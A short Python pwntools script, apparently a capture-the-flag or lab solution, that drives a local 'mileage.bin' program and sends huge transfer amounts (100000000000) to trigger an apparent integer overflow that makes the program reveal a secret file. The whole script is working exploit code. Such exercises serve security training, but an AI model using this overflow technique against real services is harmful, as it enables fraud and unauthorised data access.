#!/usr/bin/python3


from pwn import *
import time

def exploit():
    try:
        p = process("./mileage.bin")

        for i in range(6):
            p.recvline(timeout=1)

        p.recvuntil(b"(Enter 1~3): ", timeout=1)
        p.sendline(b"1")
        p.recvuntil(b"Accumulated 100 point mileage, thank you!")


        for i in range (6):
            p.recvline(timeout=1)
        p.recvuntil(b"(Enter 1~3):", timeout=1)
        p.sendline(b"2")
        p.recvuntil(b"How much mileage do you want to transfer to Alice?")
        p.sendline(b"100000000000")
        p.recvuntil(b"How much mileage do you want to transfer to Bob?")
        p.sendline(b"100000000000")
        secret_file= p.recvall(timeout=1).decode('utf-8').strip()
        print(secret_file.split("\n"[0]))
        p.close()
    except EOFError:
        print("")

    except Exception as e:
        print("Error:%s" %e)

if __name__ == "__main__":
    exploit()
